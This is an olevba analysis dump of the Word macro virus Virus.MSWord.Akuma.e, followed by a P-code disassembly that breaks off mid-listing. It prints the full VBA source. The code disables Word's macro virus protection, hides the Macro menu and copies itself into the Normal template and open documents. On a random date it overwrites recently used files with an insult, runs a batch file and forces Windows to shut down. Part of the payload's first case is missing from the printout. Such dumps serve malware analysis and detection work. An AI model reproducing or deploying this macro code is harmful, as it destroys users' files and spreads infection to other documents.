olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Akuma.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Akuma.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Stand()
'Stand
'3
'Copies: 542
    On Error Resume Next
    stato = ActiveDocument.Saved
    Application.EnableCancelKey = Not -1
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    CommandBars("Tools").Controls("Macro").Enabled = False
    Application.DisplayRecentFiles = True
    RecentFiles.Maximum = 9
    Set mad = NormalTemplate.VBProject.VBComponents.Item(1)
    For c = 1 To 2
        If Left(StandFind(mad, "Private Sub Stand()", True), Len("Stand Yes")) = "Stand Yes" Then GoTo NoClear
        StandClear mad, "Private Sub ViewVBCode()"
        StandClear mad, "Sub Document_Close()"
        StandClear mad, "Private Sub Document_Close()"
        StandClear mad, "Sub Document_New()"
        StandClear mad, "Private Sub Document_New()"
        StandClear mad, "Sub Document_Open()"
        StandClear mad, "Private Sub Document_Open()"
        StandClear mad, "Sub AutoClose()"
        StandClear mad, "Private Sub AutoClose()"
        StandClear mad, "Sub AutoOpen()"
        StandClear mad, "Private Sub AutoOpen()"
        StandClear mad, "Sub AutoNew()"
        StandClear mad, "Private Sub AutoNew()"
        StandClear mad, "Private Sub Stand()"
        StandClear mad, "Private Function StandClear(DoveM, StartM)"
        StandClear mad, "Private Sub StandDestroy()"
        StandClear mad, "Private Function StandFind(DoveM, StartM, Infect)"
        StandClear mad, "Private Function StandInfect()"
        StandClear mad, "Private Function StandWrite(StartM)"
NoClear:
        Set mad = ActiveDocument.VBProject.VBComponents.Item(1)
    Next c
    SetAttr "c:\Stand.log", vbNormal
    Kill "c:\Stand.log"
    Open "c:\Stand.log" For Output As #1
    StandWrite "Private Sub Stand()"
    StandWrite "Private Function StandClear(DoveM, StartM)"
    StandWrite "Private Sub StandDestroy()"
    StandWrite "Private Function StandFind(DoveM, StartM, Infect)"
    StandWrite "Private Function StandInfect()"
    StandWrite "Private Function StandWrite(StartM)"
    StandWrite "Private Sub Document_Close()"
    StandWrite "Private Sub Document_Open()"
    StandWrite "Private Sub Document_New()"
    StandWrite "Private Sub ViewVBCode()"
    Close #1
    SetAttr "c:\Stand.log", vbNormal
    arg = StandInfect
    Kill "c:\Stand.log"
    Set stress = ActiveDocument
    If Left(ActiveDocument.Name, 8) <> "Document" And arg = 2 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    ActiveDocument.Saved = stato
    On Error GoTo 0
End Sub

Private Function StandClear(DoveM, StartM)
'Stand
'3
    Count = StandFind(DoveM, StartM, True)
    If Left(Count, 5) <> "Stand" Then
        Do Until DoveM.CodeModule.Lines(Count, 1) = "End Sub" Or DoveM.CodeModule.Lines(Count, 1) = "End Function"
            DoveM.CodeModule.DeleteLines (Count)
        Loop
        DoveM.CodeModule.DeleteLines (Count)
    End If
End Function

Private Sub StandDestroy()
'Stand
'3
    On Error Resume Next
    SetAttr "c:\autoexec.kil", vbNormal
    Kill "c:\autoexec.kil"
    Randomize
    WhickStand = Int(5 * Rnd) + 1
    Select Case WhickStand
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
            Print #1, "rem Hey, looser, now your system, next time I'll KILL YOU"
            Close #1
            Shell "c:\kill.bat"
        Case 2
            MsgBox "This application caused a general protection error:" + Chr$(10) + "The system will be restarted", vbCritical, "Killer Queen"
            For c = 1 To Application.RecentFiles.Count
                If Left(Application.RecentFiles.Item(c).Path, 3) <> "A:\" Then
                    Open Application.RecentFiles.Item(c).Path + "\" + Application.RecentFiles.Item(c) For Output As #1
                    Print #1, "Killer Queen kills stupid people like you, " + Application.UserName + "."
                    Close #1
                End If
            Next c
            Tasks.ExitWindows
        Case 3
            MsgBox "This application caused a general protection error:" + Chr$(10) + "The system will be restarted", vbCritical, "Vanilla Ice"
            Tasks.ExitWindows
        Case 4
            MsgBox "This application caused a general protection error", vbCritical, "Star Platinum"
        Case 5
            MsgBox "This application caused a general protection error", vbCritical, "Crazy Diamond"
    End Select
    On Error GoTo 0
End Sub

Private Function StandFind(DoveM, StartM, Infect)
'Stand
'3
    For Count = 1 To DoveM.CodeModule.CountOfLines
        If LCase$(DoveM.CodeModule.Lines(Count, 1)) = LCase$(StartM) Then
            If Infect = False Then
                If StartM = "Private Sub Stand()" Then
                    var = Val(Trim(Right(DoveM.CodeModule.Lines(Count + 3, 1), Len(DoveM.CodeModule.Lines(Count + 3, 1)) - 8)))
                    DoveM.CodeModule.ReplaceLine (Count + 3), "'Copies:" + Str(var + 1)
                End If
            End If
            If Trim(DoveM.CodeModule.Lines(Count + 1, 1)) = "'Stand" And Val(Trim(Right(DoveM.CodeModule.Lines(Count + 2, 1), Len(DoveM.CodeModule.Lines(Count + 2, 1)) - 1))) >= 3 Then
                StandFind = "Stand Yes" + Str(Count)
                Exit Function
            ElseIf Trim(DoveM.CodeModule.Lines(Count + 1, 1)) = "'Stand" And Val(Trim(Right(DoveM.CodeModule.Lines(Count + 2, 1), Len(DoveM.CodeModule.Lines(Count + 2, 1)) - 1))) < 3 Then
                GoTo FindIt
            Else
FindIt:         For cnt = 1 To DoveM.CodeModule.CountOfLines
                    If LCase$(DoveM.CodeModule.Lines(cnt, 1)) = LCase$(StartM) Then Exit For
                Next cnt
                StandFind = cnt
                Exit Function
            End If
        End If
    Next Count
    StandFind = "Stand"
End Function

Private Function StandInfect()
'Stand
'3
    If StandFind(NormalTemplate.VBProject.VBComponents.Item(1), "Private Sub Stand()", True) = "Stand" Then
        Set mad = NormalTemplate.VBProject.VBComponents.Item(1): flag = True: StandInfect = 1
    ElseIf StandFind(ActiveDocument.VBProject.VBComponents.Item(1), "Private Sub Stand()", True) = "Stand" Then
        Set mad = ActiveDocument.VBProject.VBComponents.Item(1): flag = True: StandInfect = 2
    Else
        flag = False: StandInfect = 3
    End If
    If flag = True Then
        Open "c:\Stand.log" For Input As #2
        If LOF(2) = 0 Then GoTo cpyvir
        Count = 1
        Do While Not EOF(2)
            Line Input #2, stress
            mad.CodeModule.InsertLines Count, stress
            Count = Count + 1
        Loop
cpyvir: Close #2
    End If
End Function

Private Function StandWrite(StartM)
'Stand
'3
    Count = StandFind(MacroContainer.VBProject.VBComponents.Item(1), StartM, False)
    If Count <> "Stand" Then
        If Left(Count, Len("Stand Yes")) = "Stand Yes" Then
            Count = Val(Right(Count, Len(Count) - Len("Stand Yes")))
        End If
        Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Sub" Or MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Function"
            stress = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
            Print #1, stress
            Count = Count + 1
        Loop
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
        Print #1, ""
    End If
End Function

Private Sub Document_Close()
'Stand
'3
    On Error Resume Next
    If Dir("c:\autoexec.kil", vbArchive + vbHidden + vbReadOnly) = "" Then
        Open "c:\autoexec.kil" For Output As #1
        Randomize
        Dataccia = DateAdd("d", Int((30 * Rnd) + 1), Date)
        Print #1, Dataccia
        Close #1
        SetAttr "c:\autoexec.kil", vbArchive + vbHidden + vbReadOnly
    Else
        Open "c:\autoexec.kil" For Input As #1
        Line Input #1, Dataccia
        Close #1
        If DateDiff("d", Date, Dataccia) <= 0 Then StandDestroy
    End If
End Sub

Private Sub Document_Open()
'Stand
'3
    Stand
End Sub

Private Sub Document_New()
'Stand
'3
    Stand
End Sub

Private Sub ViewVBCode()
    MsgBox "This application caused a general protection error:" + Chr$(10) + "The system will be restarted", vbCritical, "Dr. Watson"
    Tasks.ExitWindows
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Akuma.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15436 bytes
' Line #0:
' 	FuncDefn (Private Sub Stand())
' Line #1:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #2:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #3:
' 	QuoteRem 0x0000 0x000B "Copies: 542"
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St stato 
' Line #6:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #11:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #12:
' 	LitDI2 0x0009 
' 	Ld RecentFiles 
' 	MemSt Maximum 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set mad 
' Line #14:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #15:
' 	Ld mad 
' 	LitStr 0x0013 "Private Sub Stand()"
' 	LitVarSpecial (True)
' 	ArgsLd StandFind 0x0003 
' 	LitStr 0x0009 "Stand Yes"
' 	FnLen 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "Stand Yes"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoClear 
' 	EndIf 
' Line #16:
' 	Ld mad 
' 	LitStr 0x0018 "Private Sub ViewVBCode()"
' 	ArgsCall StandClear 0x0002 
' Line #17:
' 	Ld mad 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	ArgsCall StandClear 0x0002 
' Line #18:
' 	Ld mad 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	ArgsCall StandClear 0x0002 
' Line #19:
' 	Ld mad 
' 	LitStr 0x0012 "Sub Document_New()"
' 	ArgsCall StandClear 0x0002 
' Line #20:
' 	Ld mad 
' 	LitStr 0x001A "Private Sub Document_New()"
' 	ArgsCall StandClear 0x0002 
' Line #21:
' 	Ld mad 
' 	LitStr 0x0013 "Sub Document_Open()"
' 	ArgsCall StandClear 0x0002 
' Line #22:
' 	Ld mad 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	ArgsCall StandClear 0x0002 
' Line #23:
' 	Ld mad 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsCall StandClear 0x0002 
' Line #24:
' 	Ld mad 
' 	LitStr 0x0017 "Private Sub AutoClose()"
' 	ArgsCall StandClear 0x0002 
' Line #25:
' 	Ld mad 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	ArgsCall StandClear 0x0002 
' Line #26:
' 	Ld mad 
' 	LitStr 0x0016 "Private Sub AutoOpen()"
' 	ArgsCall StandClear 0x0002 
' Line #27:
' 	Ld mad 
' 	LitStr 0x000D "Sub AutoNew()"
' 	ArgsCall StandClear 0x0002 
' Line #28:
' 	Ld mad 
' 	LitStr 0x0015 "Private Sub AutoNew()"
' 	ArgsCall StandClear 0x0002 
' Line #29:
' 	Ld mad 
' 	LitStr 0x0013 "Private Sub Stand()"
' 	ArgsCall StandClear 0x0002 
' Line #30:
' 	Ld mad 
' 	LitStr 0x002A "Private Function StandClear(DoveM, StartM)"
' 	ArgsCall StandClear 0x0002 
' Line #31:
' 	Ld mad 
' 	LitStr 0x001A "Private Sub StandDestroy()"
' 	ArgsCall StandClear 0x0002 
' Line #32:
' 	Ld mad 
' 	LitStr 0x0031 "Private Function StandFind(DoveM, StartM, Infect)"
' 	ArgsCall StandClear 0x0002 
' Line #33:
' 	Ld mad 
' 	LitStr 0x001E "Private Function StandInfect()"
' 	ArgsCall StandClear 0x0002 
' Line #34:
' 	Ld mad 
' 	LitStr 0x0023 "Private Function StandWrite(StartM)"
' 	ArgsCall StandClear 0x0002 
' Line #35:
' 	Label NoClear 
' Line #36:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set mad 
' Line #37:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' 	LitStr 0x000C "c:\Stand.log"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #39:
' 	LitStr 0x000C "c:\Stand.log"
' 	ArgsCall Kill 0x0001 
' Line #40:
' 	LitStr 0x000C "c:\Stand.log"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #41:
' 	LitStr 0x0013 "Private Sub Stand()"
' 	ArgsCall StandWrite 0x0001 
' Line #42:
' 	LitStr 0x002A "Private Function StandClear(DoveM, StartM)"
' 	ArgsCall StandWrite 0x0001 
' Line #43:
' 	LitStr 0x001A "Private Sub StandDestroy()"
' 	ArgsCall StandWrite 0x0001 
' Line #44:
' 	LitStr 0x0031 "Private Function StandFind(DoveM, StartM, Infect)"
' 	ArgsCall StandWrite 0x0001 
' Line #45:
' 	LitStr 0x001E "Private Function StandInfect()"
' 	ArgsCall StandWrite 0x0001 
' Line #46:
' 	LitStr 0x0023 "Private Function StandWrite(StartM)"
' 	ArgsCall StandWrite 0x0001 
' Line #47:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	ArgsCall StandWrite 0x0001 
' Line #48:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	ArgsCall StandWrite 0x0001 
' Line #49:
' 	LitStr 0x001A "Private Sub Document_New()"
' 	ArgsCall StandWrite 0x0001 
' Line #50:
' 	LitStr 0x0018 "Private Sub ViewVBCode()"
' 	ArgsCall StandWrite 0x0001 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #52:
' 	LitStr 0x000C "c:\Stand.log"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #53:
' 	Ld StandInfect 
' 	St arg 
' Line #54:
' 	LitStr 0x000C "c:\Stand.log"
' 	ArgsCall Kill 0x0001 
' Line #55:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set stress 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	Ld arg 
' 	LitDI2 0x0002 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #57:
' 	Ld stato 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #58:
' 	OnError (GoTo 0) 
' Line #59:
' 	EndSub 
' Line #60:
' Line #61:
' 	FuncDefn (Private Function StandClear(DoveM, StartM, id_FFFE As Variant))
' Line #62:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #63:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #64:
' 	Ld DoveM 
' 	Ld StartM 
' 	LitVarSpecial (True)
' 	ArgsLd StandFind 0x0003 
' 	St Count 
' Line #65:
' 	Ld Count 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Stand"
' 	Ne 
' 	IfBlock 
' Line #66:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "End Function"
' 	Eq 
' 	Or 
' 	DoUnitil 
' Line #67:
' 	Ld Count 
' 	Paren 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #68:
' 	Loop 
' Line #69:
' 	Ld Count 
' 	Paren 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	EndFunc 
' Line #72:
' Line #73:
' 	FuncDefn (Private Sub StandDestroy())
' Line #74:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #75:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #76:
' 	OnError (Resume Next) 
' Line #77:
' 	LitStr 0x000F "c:\autoexec.kil"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #78:
' 	LitStr 0x000F "c:\autoexec.kil"
' 	ArgsCall Kill 0x0001 
' Line #79:
' 	ArgsCall Read 0x0000 
' Line #80:
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St WhickStand 
' Line #81:
' 	Ld WhickStand 
' 	SelectCase 
' Line #82:
' 	QuoteRem 0x0000 0x0000 ""
' Line #83:
' 	QuoteRem 0x0000 0x0000 ""
' Line #84:
' 	QuoteRem 0x0000 0x0000 ""
' Line #85:
' 	QuoteRem 0x0000 0x0000 ""
' Line #86:
' 	QuoteRem 0x0000 0x0000 ""
' Line #87:
' 	QuoteRem 0x0000 0x0000 ""
' Line #88:
' 	QuoteRem 0x0000 0x0000 ""
' Line #89:
' 	QuoteRem 0x0000 0x0000 ""
' Line #90:
' 	QuoteRem 0x0000 0x0000 ""
' Line #91:
' 	QuoteRem 0x0000 0x0000 ""
' Line #92:
' 	QuoteRem 0x0000 0x0000 ""
' Line #93:
' 	QuoteRem 0x0000 0x0000 ""
' Line #94:
' 	QuoteRem 0x0000 0x0000 ""
' Line #95:
' 	QuoteRem 0x0000 0x0000 ""
' Line #96:
' 	QuoteRem 0x0000 0x0000 ""
' Line #97:
' 	QuoteRem 0x0000 0x0000 ""
' Line #98:
' 	QuoteRem 0x0000 0x0000 ""
' Line #99:
' 	QuoteRem 0x0000 0x0000 ""
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0039 "rem Hey, looser, now your system, next time I'll KILL YOU"
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #102:
' 	LitStr 0x000B "c:\kill.bat"
' 	ArgsCall Shell 0x0001 
' Line #103:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #104:
' 	LitStr 0x0033 "This application caused a general protection error:"
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x001C "The system will be restarted"
' 	Add 
' 	Ld vbCritical 
' 	LitStr 0x000C "Killer Queen"
' 	ArgsCall MsgBox 0x0003 
' Line #105:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	MemLd Count 
' 	For 
' Line #106:
' 	Ld c 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "A:\"
' 	Ne 
' 	IfBlock 
' Line #107:
' 	Ld c 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld c 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	ArgsMemLd Item 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "Killer Queen kills stupid people like you, "
' 	Ld Application 
' 	MemLd UserName 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #112:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #113:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #114:
' 	LitStr 0x0033 "This application caused a general protection error:"
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x001C "The system will be restarted"
' 	Add 
' 	Ld vbCritical 
' 	LitStr 0x000B "Vanilla Ice"
' 	ArgsCall MsgBox 0x0003 
' Line #115:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #116:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #117:
' 	LitStr 0x0032 "This application caused a general protection error"
' 	Ld vbCritical 
' 	LitStr 0x000D "Star Platinum"
' 	ArgsCall MsgBox 0x0003 
' Line #118:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #119:
' 	LitStr 0x0032 "This application caused a general protection error"
' 	Ld vbCritical 
' 	LitStr 0x000D "Crazy Diamond"
' 	ArgsCall MsgBox 0x0003 
' Line #120:
' 	EndSelect 
' Line #121:
' 	OnError (GoTo 0) 
' Line #122:
' 	EndSub 
' Line #123:
' Line #124:
' 	FuncDefn (Private Function StandFind(DoveM, StartM, Infect, id_FFFE As Variant))
' Line #125:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #126:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #127:
' 	StartForVariable 
' 	Ld Count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #128:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd LCase$ 0x0001 
' 	Ld StartM 
' 	ArgsLd LCase$ 0x0001 
' 	Eq 
' 	IfBlock 
' Line #129:
' 	Ld Infect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #130:
' 	Ld StartM 
' 	LitStr 0x0013 "Private Sub Stand()"
' 	Eq 
' 	IfBlock 
' Line #131:
' 	Ld Count 
' 	LitDI2 0x0003 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Count 
' 	LitDI2 0x0003 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0008 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Trim 0x0001 
' 	ArgsLd Val 0x0001 
' 	St var 
' Line #132:
' 	Ld Count 
' 	LitDI2 0x0003 
' 	Add 
' 	Paren 
' 	LitStr 0x0008 "'Copies:"
' 	Ld var 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0006 "'Stand"
' 	Eq 
' 	Ld Count 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Count 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Trim 0x0001 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0003 
' 	Ge 
' 	And 
' 	IfBlock 
' Line #136:
' 	LitStr 0x0009 "Stand Yes"
' 	Ld Count 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	St StandFind 
' Line #137:
' 	ExitFunc 
' Line #138:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0006 "'Stand"
' 	Eq 
' 	Ld Count 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Count 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Trim 0x0001 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0003 
' 	Lt 
' 	And 
' 	ElseIfBlock 
' Line #139:
' 	GoTo FindIt 
' Line #140:
' 	ElseBlock 
' Line #141:
' 	Label FindIt 
' 	StartForVariable 
' 	Ld cnt 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #142:
' 	Ld cnt 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd LCase$ 0x0001 
' 	Ld StartM 
' 	ArgsLd LCase$ 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #143:
' 	StartForVariable 
' 	Ld cnt 
' 	EndForVariable 
' 	NextVar 
' Line #144:
' 	Ld cnt 
' 	St StandFind 
' Line #145:
' 	ExitFunc 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	EndIfBlock 
' Line #148:
' 	StartForVariable 
' 	Ld Count 
' 	EndForVariable 
' 	NextVar 
' Line #149:
' 	LitStr 0x0005 "Stand"
' 	St StandFind 
' Line #150:
' 	EndFunc 
' Line #151:
' Line #152:
' 	FuncDefn (Private Function StandInfect(id_FFFE As Variant))
' Line #153:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #154:
' 	QuoteRem 0x0000 0x0001 "3"
' Line #155:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	LitStr 0x0013 "Private Sub Stand()"
' 	LitVarSpecial (True)
' 	ArgsLd StandFind 0x0003 
' 	LitStr 0x0005 "Stand"
' 	Eq 
' 	IfBlock 
' Line #156:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set mad 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St flag 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St StandInfect 
' Line #157:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	LitStr 0x0013 "Private Sub Stand()"
' 	LitVarSpecial (True)
' 	ArgsLd StandFind 0x0003 
' 	LitStr 0x0005 "Stand"
' 	Eq 
' 	ElseIfBlock 
' Line #158:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set mad 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St flag 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	St StandInfect 
' Line #159:
' 	ElseBlock 
' Line #160:
' 	LitVarSpecial (False)
' 	St flag 
' 	BoS 0x0000 
' 	LitDI2 0x0003 
' 	St StandInfect 
' Line #161:
' 	EndIfBlock 
' Line #162:
' 	Ld flag 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #163:
' 	LitStr 0x000C "c:\Stand.log"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #164:
' 	LitDI2 0x0002 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cpyvir 
' 	EndIf 
' Line #165:
' 	LitDI2 0x0001 
' 	St Count 
' Line #166:
' 	LitDI2 0x0002 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #167:
' 	LitDI2 0x0002 
' 	Ld stress 
' 	LineInput 
' Line #168:
